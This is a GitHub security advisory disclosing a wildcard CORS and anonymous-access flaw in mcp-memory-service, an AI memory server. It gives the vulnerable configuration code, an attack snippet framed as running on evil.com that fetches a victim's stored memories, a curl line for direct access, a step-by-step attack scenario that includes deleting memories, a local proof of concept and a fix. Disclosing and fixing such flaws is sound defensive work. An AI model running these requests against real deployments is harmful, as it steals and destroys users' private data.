<p>When the HTTP server is enabled (<code>MCP_HTTP_ENABLED=true</code>), the application configures FastAPI's CORSMiddleware with <code>allow_origins=['*']</code>, <code>allow_credentials=True</code>, <code>allow_methods=["*"]</code>, and <code>allow_headers=["*"]</code>. The wildcard <code>Access-Control-Allow-Origin: *</code> header permits any website to read API responses cross-origin. When combined with anonymous access (<code>MCP_ALLOW_ANONYMOUS_ACCESS=true</code>) - the simplest way to get the HTTP dashboard working without OAuth - no credentials are needed, so any malicious website can silently read, modify, and delete all stored memories.</p>
<h3 id="details">Details</h3>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<p><strong><code>config.py:546</code> - Wildcard CORS origin default</strong></p>
<pre><code class="language-python">CORS_ORIGINS = os.getenv('MCP_CORS_ORIGINS', '*').split(',')
</code></pre>
<p>This produces <code>['*']</code> by default, allowing any origin.</p>
<p><strong><code>app.py:274-280</code> - CORSMiddleware configuration</strong></p>
<pre><code class="language-python"># CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,        # ['*'] by default
    allow_credentials=True,             # Unnecessary for anonymous access; bad practice
    allow_methods=["*"],
    allow_headers=["*"],
)
</code></pre>
<h3 id="how-the-attack-works">How the Attack Works</h3>
<p>The wildcard CORS default means every API response includes <code>Access-Control-Allow-Origin: *</code>. This tells browsers to allow <strong>any website</strong> to read the response. When combined with anonymous access (no authentication required), the attack is straightforward:</p>
<pre><code class="language-javascript">// Running on https://evil.com - reads victim's memories
// No credentials needed - anonymous access means the API is open
const response = await fetch('http://192.168.1.100:8000/api/memories');
const memories = await response.json();
// memories contains every stored memory - passwords, API keys, personal notes
</code></pre>
<p>The browser sends the request, the server responds with <code>ACAO: *</code>, and the browser allows the JavaScript to read the response body. No cookies, no auth headers, no credentials of any kind.</p>
<p><strong>Clarification on <code>allow_credentials=True</code>:</strong> The advisory originally stated that Starlette reflects the <code>Origin</code> header when <code>allow_credentials=True</code> with wildcard origins. Testing with Starlette 0.52.1 shows that <strong>actual responses return <code>ACAO: *</code></strong> (not the reflected origin); only preflight <code>OPTIONS</code> responses reflect the origin. Per the Fetch specification, browsers block <code>ACAO: *</code> when <code>credentials: 'include'</code> is used. However, this is irrelevant to the attack because <strong>anonymous access means no credentials are needed</strong> - a plain <code>fetch()</code> without <code>credentials: 'include'</code> works, and <code>ACAO: *</code> allows it.</p>
<h3 id="two-attack-vectors">Two Attack Vectors</h3>
<p>This misconfiguration enables two distinct attack paths:</p>
<p><strong>1. Cross-origin browser attack (CORS - this advisory)</strong></p>
<ul>
<li>Attacker lures victim to a malicious webpage</li>
<li>JavaScript on the page reads/writes the memory service API</li>
<li>Works from anywhere on the internet if the victim visits the page</li>
<li>The <code>ACAO: *</code> header is what allows the browser to expose the response to the attacker's JavaScript</li>
</ul>
<p><strong>2. Direct network access (compounding factor)</strong></p>
<ul>
<li>Attacker on the same network directly calls the API (<code>curl http://&lt;target&gt;:8000/api/memories</code>)</li>
<li>No CORS involved - CORS is a browser-only restriction</li>
<li>Enabled by <code>0.0.0.0</code> binding + anonymous access, independent of CORS configuration</li>
</ul>
<p>The CORS misconfiguration specifically enables attack vector #1, extending the reach from local network to anyone who can get the victim to click a link.</p>
<h3 id="compounding-factors">Compounding Factors</h3>
<ul>
<li><strong><code>HTTP_HOST = '0.0.0.0'</code></strong> - Binds to all interfaces, exposing the service to the entire network (enables attack vector #2)</li>
<li><strong><code>HTTPS_ENABLED = 'false'</code></strong> - No TLS by default, allowing passive interception</li>
<li><strong><code>MCP_ALLOW_ANONYMOUS_ACCESS</code></strong> - When enabled, no authentication is required at all. This is the key enabler: without it, the CORS wildcard alone would not allow data access (the attacker would need to forward valid credentials, which <code>ACAO: *</code> blocks)</li>
<li><strong><code>allow_credentials=True</code></strong> - Bad practice: if a future Starlette version changes to reflect origins (as some CORS implementations do), this would escalate the vulnerability by allowing credential-forwarding attacks against OAuth/API-key users</li>
<li><strong>API key via query parameter</strong> - <code>api_key</code> query param is cached in browser history and server logs</li>
</ul>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Victim runs <code>mcp-memory-service</code> with HTTP enabled and anonymous access</li>
<li>Victim visits <code>https://evil.com</code> which includes JavaScript</li>
<li>JavaScript sends <code>fetch('http://&lt;victim-ip&gt;:8000/api/memories')</code> (no credentials needed)</li>
<li>Server responds with <code>Access-Control-Allow-Origin: *</code></li>
<li>Browser allows JavaScript to read the response - attacker receives all memories</li>
<li>Attacker's script also calls DELETE/PUT endpoints to modify or destroy memories</li>
<li>Victim sees a normal web page; no indication of the attack</li>
</ol>
<h3 id="root-cause">Root Cause</h3>
<p>The default value of <code>MCP_CORS_ORIGINS</code> is <code>*</code>, which allows any website to read API responses. This is a permissive default that should be restricted to the expected dashboard origin (typically <code>localhost</code>). The <code>allow_credentials=True</code> is an additional misconfiguration that doesn't currently enable the attack.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from starlette.testclient import TestClient

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/api/memories")
def memories():
    return [{"content": "secret memory data"}]

client = TestClient(app)

# Non-credentialed request (how the real attack works with anonymous access)
response = client.get("/api/memories", headers={"Origin": "https://evil.com"})
print(response.headers["access-control-allow-origin"])  # *
print(response.json())  # [{"content": "secret memory data"}]
# Any website can read this response because ACAO is *
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Complete cross-origin memory access</strong>: Any website can read all stored memories when the victim has the HTTP server running with anonymous access</li>
<li><strong>Memory tampering</strong>: Write/delete endpoints are also accessible cross-origin, allowing memory destruction</li>
<li><strong>Remote attack surface</strong>: Unlike direct network access (which requires LAN proximity), the CORS vector works from anywhere on the internet - the victim just needs to visit a link</li>
<li><strong>Silent exfiltration</strong>: The attack is invisible to the victim; no browser warnings, no popups, no indicators</li>
</ul>
<h2 id="remediation">Remediation</h2>
<p>Replace the wildcard default with an explicit localhost origin:</p>
<pre><code class="language-python"># In config.py  (safe default)
CORS_ORIGINS = os.getenv('MCP_CORS_ORIGINS', 'http://localhost:8000,http://127.0.0.1:8000').split(',')

# In app.py - warn on wildcard
if '*' in CORS_ORIGINS:
    logger.warning("Wildcard CORS origin detected. This allows any website to access the API. "
                    "Set MCP_CORS_ORIGINS to restrict access.")

# Also: set allow_credentials=False unless specific origins are configured
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials='*' not in CORS_ORIGINS,  # Only with explicit origins
    allow_methods=["*"],
    allow_headers=["*"],
)
</code></pre>
<h2 id="affected-deployments">Affected Deployments</h2>
<p>The vulnerability exists in the Python source code and is not mitigated by any deployment-specific configuration. Docker HTTP mode is the highest-risk deployment because it explicitly binds to <code>0.0.0.0</code>, maps the port, and does not override the wildcard CORS default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-g9rg-8vq5-mpwm">https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-g9rg-8vq5-mpwm</a></li>
<li><a href="https://github.com/advisories/GHSA-g9rg-8vq5-mpwm">https://github.com/advisories/GHSA-g9rg-8vq5-mpwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g9rg-8vq5-mpwm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-07T02:12:26.000Z</published>
    </entry>
</feed>